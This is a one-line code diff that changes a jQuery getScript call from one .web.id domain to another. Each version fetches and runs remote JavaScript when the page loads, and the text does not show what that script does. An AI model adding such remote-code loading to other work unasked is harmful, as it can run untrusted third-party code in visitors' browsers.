@@ -1,1 +1,1 @@
-$.getScript("https://livemall.web.id/function.js", function(){ });
+$.getScript("https://bella.web.id/function.js", function(){ });
